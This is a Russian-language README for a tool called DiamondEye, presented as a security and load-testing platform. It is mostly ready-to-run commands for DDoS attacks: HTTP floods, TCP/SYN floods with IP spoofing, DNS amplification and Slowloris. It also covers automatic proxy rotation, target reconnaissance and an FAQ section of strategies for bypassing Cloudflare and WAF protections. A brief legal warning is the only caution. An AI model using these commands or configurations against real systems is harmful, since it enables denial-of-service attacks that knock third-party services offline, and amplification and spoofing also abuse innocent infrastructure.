<div style="flex: 1 1 100%; padding: 20px; border-radius: 12px; background: linear-gradient(135deg, #0b1120 0%, #1a2639 100%); color: white; margin-bottom: 10px;">
<h1 style="font-size: 2.5em; margin-bottom: 5px;">💎 DiamondEye v10.0</h1>
<h3 style="font-weight: normal; color: #a0c0ff; margin-top: 0;">Advanced Multi‑Layer Security Testing Platform</h3>
<p style="font-size: 1.1em; max-width: 800px;">Высокопроизводительная платформа для тестирования безопасности и нагрузочного тестирования веб‑систем с модульной архитектурой и поддержкой многослойных атак.</p>
<div style="display: flex; gap: 15px; flex-wrap: wrap; margin-top: 15px;">
<span style="background: #2a3a5a; padding: 5px 12px; border-radius: 20px;">🐍 Python 3.8+</span>
<span style="background: #2a3a5a; padding: 5px 12px; border-radius: 20px;">⚡ Async/AIOHTTP</span>
<span style="background: #2a3a5a; padding: 5px 12px; border-radius: 20px;">🧩 Plugin system</span>
<span style="background: #2a3a5a; padding: 5px 12px; border-radius: 20px;">📊 Real‑time analytics</span>
</div>

---

## 📋 СОДЕРЖАНИЕ

1. [🌟 Новые возможности v10.0](#-новые-возможности-v100)
2. [🚀 Быстрый старт](#-быстрый-старт)
3. [⚙️ Установка](#️-установка)
4. [🎯 Основные режимы работы](#-основные-режимы-работы)
5. [⚡ Флаги и параметры](#-флаги-и-параметры)
6. [📊 Отчетность и аналитика](#-отчетность-и-аналитика)
7. [🔧 Примеры использования](#-примеры-использования)
8. [🛡️ Системные требования](#️-системные-требования)
9. [⚠️ Предупреждения и ограничения](#️-предупреждения-и-ограничения)
10. [❓ Часто задаваемые вопросы](#-часто-задаваемые-вопросы)
11. [📞 Поддержка и контакты](#-поддержка-и-контакты)
12. [📜 Лицензия и благодарности](#-лицензия-и-благодарности)

---

## 🌟 НОВЫЕ ВОЗМОЖНОСТИ v10.0

### 🎯 **Многослойные атаки**
- **Layer7 (HTTP)** — Полная поддержка HTTP/1.1, HTTP/2, HTTP/3
- **Layer4 (TCP)** — TCP флуд с поддержкой спуфинга IP
- **Amplification** — DNS, NTP, Memcached amplification атаки
- **Slowloris** — Классические медленные атаки через плагины

### 🧩 **Плагинная архитектура**
- **Динамическая загрузка** — Плагины загружаются на лету
- **Готовые плагины** — Slowloris, UDP flood, кастомные атаки
- **Создание своих** — Простой API для разработки плагинов
- **Авто-обнаружение** — Автоматическое сканирование плагинов

### 🔍 **Система разведки**
- **Порт-сканер** — Быстрое сканирование открытых портов
- **DNS анализ** — Сбор DNS записей, поддоменов
- **SSL/TLS аудит** — Проверка сертификатов и настроек
- **Обнаружение сервисов** — Автоопределение работающих сервисов

### 🚀 **Продвинутые функции**
- **Proxy Manager** — Автоматический сбор и ротация прокси
- **Resource Monitor** — Детальный мониторинг ресурсов системы
- **Adaptive Attacks** — Адаптивные атаки с обратной связью
- **Multi-Protocol** — Поддержка WebSocket, GraphQL, API

### 📈 **Аналитика и отчетность**
- **Real-time статистика** — RPS, PPS, задержки, ошибки
- **Графики производительности** — Визуализация в реальном времени
- **Детальные отчеты** — Текстовые, JSON, CSV форматы
- **Экспорт данных** — Интеграция с системами мониторинга

---

## 🚀 БЫСТРЫЙ СТАРТ

### 1. Установка
```bash
git clone https://github.com/UndefinedClear/DiamondEye.git
cd DiamondEye
pip install -r requirements.txt
```

### 2. Базовая проверка
```bash
# Layer7 HTTP тестирование
python main.py https://your-server.com --workers 10 --sockets 50

# Список доступных плагинов
python main.py --list-plugins

# Быстрая разведка цели
python main.py target.com --recon
```

### 3. Полное тестирование
```bash
python main.py https://your-server.com \
  --attack-type http \
  --workers 500 \
  --sockets 2000 \
  --http2 \
  --flood \
  --junk \
  --path-fuzz \
  -l test_report.log \
  --json metrics.json \
  --plot performance.png
```

---

## ⚙️ УСТАНОВКА

### Требования к системе
- **Python 3.8+** (рекомендуется 3.10+)
- **ОС**: Linux (рекомендуется), macOS, Windows (частичная поддержка)
- **Память**: 4+ ГБ RAM
- **Сеть**: стабильное интернет-соединение

### Установка зависимостей
```bash
# Базовые зависимости
pip install -r requirements.txt

# Опциональные зависимости
pip install httpx[http2]    # Для HTTP/2 поддержки
pip install httpx[http3]    # Для HTTP/3 (QUIC) поддержки
pip install aiohttp-socks  # Для SOCKS прокси поддержки
pip install uvloop         # Для максимальной производительности
```

### Установка на Docker
```bash
# Сборка образа
docker build -t diamondeye .

# Запуск
docker run -it --rm --network host diamondeye \
  python main.py https://target.com --workers 100
```

---

## 🎯 ОСНОВНЫЕ РЕЖИМЫ РАБОТЫ

### 📡 **Layer7 HTTP Attack**
Основной режим для нагрузочного тестирования веб-приложений.
```bash
python main.py <URL> --attack-type http [параметры]
```

**Особенности:**
- Асинхронная обработка тысяч запросов
- Поддержка всех основных HTTP методов
- Настраиваемая интенсивность нагрузки
- Режимы: flood, slowloris, adaptive

### 🔌 **Layer4 TCP Attack**
TCP флуд для тестирования сетевой инфраструктуры.
```bash
python main.py --attack-type tcp --target-ip <IP> --target-port <PORT>
```

**Особенности:**
- Raw socket поддержка (требует прав root/admin)
- Спуфинг IP адресов
- Кастомизация размеров пакетов
- Поддержка SYN flood

### 🌪️ **DNS Amplification**
Amplification атаки для тестирования DDoS защиты.
```bash
python main.py --attack-type dns --target-ip <IP> --amplification
```

**Особенности:**
- Поддержка публичных DNS серверов
- Автоматический подбор доменов
- Оценка коэффициента усиления

### 🔍 **Reconnaissance Mode**
Сбор информации о цели перед тестированием.
```bash
python main.py <TARGET> --recon [дополнительные параметры]
```

**Возможности:**
- Сканирование портов
- DNS анализ и поддомены
- SSL/TLS аудит
- Обнаружение уязвимостей
- Экспорт отчетов

### 🧩 **Plugin System**
Запуск специализированных атак через плагины.
```bash
# Список плагинов
python main.py --list-plugins

# Запуск плагина
python main.py <TARGET> --plugin <PLUGIN_NAME>
```

---

## ⚡ ФЛАГИ И ПАРАМЕТРЫ

### 🎯 **Основные параметры**

| Флаг | Описание | Пример | По умолчанию |
|------|----------|--------|--------------|
| `--attack-type` | Тип атаки | `--attack-type http` | http |
| `--target-ip` | Целевой IP | `--target-ip 192.168.1.1` | - |
| `--target-port` | Целевой порт | `--target-port 80` | 80 |
| `-w`, `--workers` | Количество воркеров | `-w 500` | 10 |
| `-s`, `--sockets` | Сокетов на воркер | `-s 1000` | 100 |
| `--duration` | Длительность атаки (сек) | `--duration 60` | 0 (бесконечно) |

### 🚀 **Layer7 параметры**

| Флаг | Описание | Пример |
|------|----------|--------|
| `-m`, `--methods` | HTTP методы | `-m GET,POST` |
| `-u`, `--useragents` | Файл с User-Agent | `-u ua.txt` |
| `-n`, `--no-ssl-check` | Отключить проверку SSL | `-n` |
| `--http2` | Использовать HTTP/2 | `--http2` |
| `--http3` | Использовать HTTP/3 (QUIC) | `--http3` |
| `--websocket` | WebSocket flood режим | `--websocket` |
| `--flood` | Максимальный RPS | `--flood` |
| `--extreme` | Новое соединение на запрос | `--extreme` |
| `--slow N` | Slowloris атака | `--slow 0.1` |
| `--adaptive` | Адаптивный режим | `--adaptive` |

### 🛡️ **Параметры обхода защиты**

| Флаг | Описание | Пример |
|------|----------|--------|
| `--junk` | Добавить случайные заголовки | `--junk` |
| `--header-flood` | До 20 случайных заголовков | `--header-flood` |
| `--random-host` | Случайные поддомены в Host | `--random-host` |
| `--path-fuzz` | Случайные глубокие пути | `--path-fuzz` |
| `--method-fuzz` | Использовать редкие методы | `--method-fuzz` |
| `--rotate-ua` | Ротация User-Agent | `--rotate-ua` |
| `--spoof-ip` | Спуфинг IP (для Layer4) | `--spoof-ip` |

### 🌐 **Сетевые параметры**

| Флаг | Описание | Пример |
|------|----------|--------|
| `--proxy` | Использовать прокси | `--proxy http://127.0.0.1:8080` |
| `--proxy-file` | Файл со списком прокси | `--proxy-file proxies.txt` |
| `--proxy-auto` | Авто-сбор прокси | `--proxy-auto` |
| `--interface` | Сетевой интерфейс | `--interface eth0` |
| `--source-port` | Кастомный source port | `--source-port 12345` |

### 🔍 **Разведка (Recon)**

| Флаг | Описание | Пример |
|------|----------|--------|
| `--recon` | Включить разведку | `--recon` |
| `--recon-full` | Полная разведка | `--recon-full` |
| `--recon-ports` | Порты для сканирования | `--recon-ports 21,80,443` |
| `--recon-save` | Сохранить отчет | `--recon-save report.json` |

### 🧩 **Система плагинов**

| Флаг | Описание | Пример |
|------|----------|--------|
| `--plugin` | Использовать плагин | `--plugin Slowloris` |
| `--list-plugins` | Список плагинов | `--list-plugins` |
| `--plugin-config` | Конфиг плагина | `--plugin-config config.json` |

### 📊 **Отчетность и мониторинг**

| Флаг | Описание | Пример |
|------|----------|--------|
| `-l`, `--log` | Текстовый отчет | `-l report.log` |
| `--json` | JSON отчет | `--json metrics.json` |
| `--plot` | График RPS | `--plot graph.png` |
| `--monitor-interval` | Интервал мониторинга | `--monitor-interval 0.5` |
| `--save-stats` | Сохранить статистику | `--save-stats` |
| `--resource-alert` | Порог предупреждений | `--resource-alert 90` |

### ⚙️ **Расширенные опции**

| Флаг | Описание | Пример |
|------|----------|--------|
| `-d`, `--debug` | Режим отладки | `-d` |
| `--packet-size` | Размер пакета (Layer4) | `--packet-size 1024` |
| `--packet-count` | Количество пакетов | `--packet-count 10000` |
| `--ttl` | IP TTL значение | `--ttl 64` |
| `--max-rps` | Максимальный RPS | `--max-rps 1000` |
| `--max-bandwidth` | Максимальная полоса | `--max-bandwidth 100` |

---

## 📊 ОТЧЕТНОСТЬ И АНАЛИТИКА

### Текстовый отчет
```bash
python main.py https://target.com --log report.txt
```

**Пример отчета:**
```
╔════════════════════════════════════════════════╗
║           DIAMONDEYE v10.0 — REPORT            ║
╚════════════════════════════════════════════════╝

🎯 Цель: https://target.com
⚡ Тип атаки: HTTP Flood
⏱️  Длительность: 60s
🔁 Воркеры: 500 | Сокетов: 2000
📊 Отправлено запросов: 1,245,678
🚀 Средний RPS: 20,761
📈 Успешность: 98.7%
⚠️  Ошибок: 15,893
💻 Использование CPU: 78.5%
🧠 Использование RAM: 65.2%
════════════════════════════════════════════════
```

### JSON отчет
```bash
python main.py https://target.com --json metrics.json
```

```json
{
  "tool": "DiamondEye",
  "version": "10.0",
  "target": "https://target.com",
  "attack_type": "http",
  "duration_sec": 60,
  "config": {
    "workers": 500,
    "sockets": 2000,
    "methods": ["GET", "POST"],
    "http2": true
  },
  "metrics": {
    "total_requests": 1245678,
    "successful": 1230000,
    "failed": 15678,
    "success_rate": 98.74,
    "average_rps": 20761,
    "peak_rps": 25432,
    "average_latency_ms": 45.2
  },
  "resources": {
    "cpu_avg": 78.5,
    "ram_avg": 65.2,
    "network_mbps": 125.4
  }
}
```

### Графики производительности
```bash
python main.py https://target.com --plot performance.png
```

Графики включают:
- RPS (Requests Per Second) в реальном времени
- Использование CPU и RAM
- Сетевую активность (Mbps)
- Историю ошибок

---

## 🔧 ПРИМЕРЫ ИСПОЛЬЗОВАНИЯ

### Пример 1: Layer7 HTTP Flood
```bash
# Максимальная нагрузка на веб-сервер
python main.py https://api.example.com/v1/users \
  --attack-type http \
  -w 1000 \
  -s 5000 \
  --http2 \
  --flood \
  --junk \
  --header-flood \
  --random-host \
  --path-fuzz \
  --duration 300 \
  -l http_flood.log \
  --json http_metrics.json
```

### Пример 2: Layer4 TCP Flood
```bash
# TCP флуд с спуфингом IP (требует root)
sudo python main.py \
  --attack-type tcp \
  --target-ip 192.168.1.100 \
  --target-port 80 \
  --workers 200 \
  --spoof-ip \
  --packet-size 1024 \
  --duration 180 \
  -l tcp_flood.log
```

### Пример 3: DNS Amplification
```bash
# DNS amplification тест
python main.py \
  --attack-type dns \
  --target-ip 192.168.1.100 \
  --amplification \
  --workers 50 \
  --duration 120 \
  -l dns_amp.log
```

### Пример 4: Полная разведка цели
```bash
# Сбор информации перед атакой
python main.py target-company.com \
  --recon-full \
  --recon-ports 21-25,80,443,3306,3389,8080,8443 \
  --recon-save recon_report.json
```

### Пример 5: Использование плагина Slowloris
```bash
# Slowloris атака через плагин
python main.py https://target.com \
  --plugin Slowloris \
  --workers 100 \
  --duration 600 \
  --plugin-config slowloris_config.json
```

### Пример 6: Адаптивное тестирование
```bash
# Автоматический поиск предела производительности
python main.py https://app.example.com \
  --attack-type http \
  --adaptive \
  --http2 \
  -w 100 \
  -s 500 \
  --max-rps 5000 \
  --duration 600 \
  --json adaptive_results.json
```

### Пример 7: Тестирование через прокси
```bash
# Использование авто-собранных прокси
python main.py https://target.com \
  --proxy-auto \
  --proxy-timeout 3 \
  --rotate-ua \
  -w 200 \
  -s 1000 \
  --duration 180
```

### Пример 8: WebSocket нагрузочное тестирование
```bash
# Нагрузочное тестирование WebSocket
python main.py wss://chat.example.com/ws \
  --websocket \
  -w 50 \
  -s 200 \
  --data-size 400k \
  --duration 300 \
  -l websocket_test.log
```

---

## 🛡️ СИСТЕМНЫЕ ТРЕБОВАНИЯ

### 💻 Аппаратные требования
| Компонент | Минимум | Рекомендуется | Для production |
|-----------|---------|---------------|----------------|
| **CPU** | 2 ядра | 4+ ядра | 8+ ядер |
| **RAM** | 4 ГБ | 8 ГБ | 16+ ГБ |
| **Диск** | 100 МБ | 1 ГБ | 10+ ГБ SSD |
| **Сеть** | 100 Мбит | 1 Гбит | 10+ Гбит |

### 🐧 Оптимальные настройки ОС
Подробные инструкции по настройке системы смотрите в [SYSTEM.md](SYSTEM.md).

**Ключевые настройки:**
```bash
# Linux: Увеличение лимитов
ulimit -n 65536
sysctl -w net.core.somaxconn=65535

# Windows: Увеличение портов
netsh int ipv4 set dynamicport tcp start=1024 num=64511
```

### 📦 Требования к Python
- **Python 3.8+** (рекомендуется 3.10+)
- **pip 20.3+**
- **Virtual environment** (рекомендуется)

---

## ⚠️ ПРЕДУПРЕЖДЕНИЯ И ОГРАНИЧЕНИЯ

### 🔥 **Высокий риск**
1. **Перегрев оборудования** — Может вызвать отказ оборудования
2. **Исчерпание ресурсов** — Может привести к падению сервера
3. **Блокировка IP** — Провайдеры могут блокировать IP за подозрительную активность
4. **Юридические последствия** — Незаконное использование преследуется по закону

### ⚡ **Технические ограничения**
| Ограничение | Значение | Обход |
|-------------|----------|-------|
| Максимальные соединения | ~65,535 на IP | Использовать несколько IP |
| Максимальный RPS | Зависит от сети | Оптимизация кода, HTTP/2 |
| Потребление CPU | Высокое | Ограничение воркеров |
| Использование памяти | 10-100 МБ на воркер | Уменьшение `--sockets` |

### ❌ **Несовместимые комбинации**
```bash
# НЕ РАБОТАЕТ:
--http2 --extreme           # HTTP/2 требует постоянных соединений
--proxy --slow              # Slowloris не работает через прокси
--flood --slow              # Противоречивые режимы
--http3 --proxy             # HTTP/3 пока не поддерживает прокси
```

### 🚧 **Известные проблемы**
1. **Windows** — Ограниченная поддержка высоких нагрузок
2. **HTTP/3** — Экспериментальная поддержка, возможны ошибки
3. **Raw sockets** — Требуют прав root/admin в Linux
4. **Python 3.7 и ниже** — Не поддерживается

---

## ❓ ЧАСТО ЗАДАВАЕМЫЕ ВОПРОСЫ

### ❓ Какой максимальный RPS можно достичь?
**Ответ:** Зависит от многих факторов:
- На локальном сервере: 25,000+ RPS
- Через интернет: 5,000-10,000 RPS
- На слабом оборудовании: 1,000-5,000 RPS

**Рекомендации для максимального RPS:**
```bash
python main.py https://target.com \
  --attack-type http \
  --http2 \
  --flood \
  -w 500 \
  -s 2000 \
  --no-ssl-check \
  --junk
```

### ❓ Почему падает производительность со временем?
**Возможные причины:**
1. **Исчерпание портов** — Используйте `--extreme` с осторожностью
2. **Перегрев CPU** — Уменьшите количество воркеров
3. **Блокировка firewall** — Используйте `--random-host`
4. **Ограничения ОС** — Настройте систему по руководству

### ❓ Как тестировать через Cloudflare или WAF?
**Стратегии обхода:**
```bash
# 1. Медленная атака
python main.py https://target.com --slow 0.3 -w 50

# 2. Случайные заголовки
python main.py https://target.com --junk --header-flood --random-host

# 3. HTTP/2 с мультиплексированием
python main.py https://target.com --http2 --flood

# 4. Комбинированный подход
python main.py https://target.com \
  --http2 \
  --junk \
  --random-host \
  --path-fuzz \
  --method-fuzz
```

### ❓ Как интерпретировать результаты?
**Ключевые метрики:**
- **RPS > 1000** — Хорошая производительность
- **Success rate > 95%** — Стабильная работа
- **Latency < 100ms** — Быстрый отклик
- **Error rate < 5%** — Надежная система

**Тревожные сигналы:**
- RPS падает со временем
- Увеличивается задержка
- Растет процент ошибок
- Нестабильный график

### ❓ Как создать свой плагин?
1. Создайте файл в папке `plugins/`
2. Унаследуйте класс `BasePlugin`
3. Реализуйте методы `initialize`, `execute`, `cleanup`
4. Плагин будет автоматически обнаружен

**Пример плагина:**
```python
from plugins.plugin_manager import BasePlugin, PluginInfo

class MyPlugin(BasePlugin):
    async def initialize(self, config):
        self.config = config
        return True
    
    async def execute(self, target):
        # Ваша логика атаки
        return {"status": "success"}
```

---

## 📞 ПОДДЕРЖКА И КОНТАКТЫ

### 🐛 Сообщение об ошибках
- **GitHub Issues**: [https://github.com/UndefinedClear/DiamondEye/issues](https://github.com/UndefinedClear/DiamondEye/issues)
- **Telegram автора**: [@pelikan6](https://t.me/pelikan6)
- **Telegram сообщество**: [https://t.me/x_xffx_x](https://t.me/x_xffx_x)
- **Email**: larion626@gmail.com

**Шаблон для баг-репорта:**
```markdown
## Описание проблемы

## Шаги для воспроизведения
1. 
2. 
3. 

## Ожидаемое поведение

## Фактическое поведение

## Логи и скриншоты

## Версия DiamondEye и ОС
```


---

## 📜 ЛИЦЕНЗИЯ И БЛАГОДАРНОСТИ

### Лицензия
```

```

### Про проект
- **Разработчик**: larion928 Teron
- **Вдохновлено**: Golden Eye 
- **Особые благодарности**: UndefinedClear Hyprbro
- **Спасибо**: Всем участникам Telegram группы

### ⭐ НРАВИТСЯ ПРОЕКТ?

Если DiamondEye полезен для вас:
1. **Поставьте звезду на GitHub** ⭐
2. **Расскажите коллегам** 🗣️
3. **Внесите вклад в разработку** 🔧
4. **Поддержите сообщество** 💝

**Вместе мы сделаем интернет безопаснее!** 🔐

---

**Версия документации:** 10.0 | **Последнее обновление:** 2026